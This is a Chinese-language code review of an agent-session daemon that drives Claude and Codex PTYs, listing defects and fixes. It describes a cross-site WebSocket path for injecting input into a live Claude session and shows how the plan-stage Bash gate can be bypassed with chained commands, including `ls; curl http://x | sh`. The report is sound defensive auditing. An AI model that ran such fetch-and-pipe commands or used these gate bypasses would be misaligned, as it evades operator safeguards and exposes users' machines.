# AgentCall v3.0 代码审查报告

审查范围：`crates/agentcall-daemon`、`crates/agentcall-mcp`、`crates/agentcall-hook`、`scripts/*hook*.py`。
基线验证：`cargo build` ✅ / `cargo test --workspace` 31 passed ✅ / `cargo clippy` 仅轻微警告。

## report.md 既有 5 问题复核

| # | 问题 | 状态 | 依据 |
|---|------|------|------|
| 1 | Codex hook UTF-8 损坏 | ✅ 已修复 | `scripts/agentcall-codex-hook.py:47` 改用 `stdin.buffer.read().decode("utf-8-sig")`；PTY 侧注入 `PYTHONUTF8=1`（`session.rs:108`） |
| 2 | v26 PTY 未形成 hook binding | ⚙️ 缓解 | env `AGENTCALL_WRAPPER_SESSION` binding 已实现（`hooks.rs:212-237`） |
| 3 | PTY 活着但不可观测 | ⚙️ 部分对应 | summary 增加 `confidence`/`unbound`/`patience`（`summary.rs:258-286`） |
| 4 | board attention 噪声过高 | ✅ 已修复 | legacy 拆到 `legacy_detached_sessions`，compact 抑制（`summary.rs:85-95`） |
| 5 | stop 锁等待 | ✅ 已修复 | 独立 `killer` Mutex，`stop_session` 不再持 `child` 锁（`session.rs:23,372-389`） |

## 新发现问题（按严重度）

### 🔴 1. WebSocket 无 Origin 校验，任意网站可向 Claude PTY 注入输入
`http.rs:218-228` 的 WS upgrade 只检查 `sec-websocket-key`，不校验 `Origin`。WebSocket 不受同源策略限制，用户访问的任意恶意网页可打开 `ws://127.0.0.1:3293/api/sessions/{name}/ws` 并发送 `{"type":"input","data":...}`，直接写入运行中的 Claude PTY（`handle_ws_message` → `writer.write_all`）。叠加全响应的 `Access-Control-Allow-Origin: *`（`http.rs:612`），GET 类接口（board/health 含 workspace 路径、session 信息）也可被任意站点读取。
- 对策：WS upgrade 与 `/api/*` 校验 `Origin`/`Host` 限制为本地预期值。

### 🟠 2. daemon-first 路径下 `context_injection` 完全失效
实际配线的是 Python hook（daemon-first POST），但 daemon `ingest_hook` 响应（`hooks.rs:142-150`）**不含 `context_injection` 字段**；Python 侧却读取它（`agentcall-claude-hook.py:30`、`agentcall-codex-hook.py:36`），导致 SessionStart/UserPromptSubmit 的「# AgentCall Context」规约注入**恒为空**。该实现仅残留在未配线的 `agentcall-hook` crate 中。CHANGELOG v0.6.1 宣称的 context 注入当前无效。
- 对策：在 daemon `ingest_hook` 返回 `context_injection`（迁移 hook crate 的 `context_injection()` 逻辑）。

### 🟠 3. plan 阶段 Bash 门禁可被链式命令绕过
`hooks.rs:627-675` `bash_readonly_allowed`：禁止词用 `contains`、允许词用**前缀匹配 `starts_with`**。`git status && python evil.py`、`ls; curl http://x | sh` 因首词在允许列表而被判为只读放行（禁止列表无 `python`/`| sh` 等）。可绕过 plan gate 与 path policy。
- 对策：含 `&&`/`;`/`|` 的复合命令直接拒绝，或分段后逐段校验。

### 🟡 4. `/api/routes`（`agentcall_route mode=start`）最长约 16s 同步阻塞
`routes.rs:617-652` prompt ack：`write_input` 内 80ms sleep（持 writer 锁，`session.rs:334`）×2 + `wait_for_user_prompt_submit` 8s×2。每连接独立线程不影响整体，但 MCP 调用方会长时间阻塞。若属刻意 ack 设计可保留，建议复核超时值。

### 🟡 5. Content-Length / WS 帧长无上限分配
`http.rs:113` `vec![0u8; content_length]`、`http.rs:423` `vec![0u8; len as usize]`（len 可达 u64）在读取前即分配。攻击者凭单个头部触发巨量内存分配→OOM；叠加 CORS 可远程触发。建议对长度做上限钳制。

### 🟢 6. 轻微
- `summary.rs:38,43`：`board_state` 重复调用 `list_sessions(state)` 两次（`pty_sessions` 与 `live_daemon_sessions`），可合并。
- `agentcall-hook` crate（504 行）未配线为死代码；其 `next_event_number`（行数+1）与 daemon `evt-max+1` 方案不兼容，若并用会 ID 冲突。建议整理/删除。
- clippy：collapsible-if 等 6 处轻微警告，`cargo clippy --fix` 可清。
- `http.rs:627` `url_decode` 仅支持 4 个序列；session 名受 `safe_name` 约束故影响小。

## 建议优先级
1. **#1 WS/CORS Origin 限制**（实质安全面）
2. **#2 context_injection 补回**（功能缺失）
3. **#3 Bash 门禁加固**（防御绕过）
4. #4/#5 健壮性
5. #6 清理
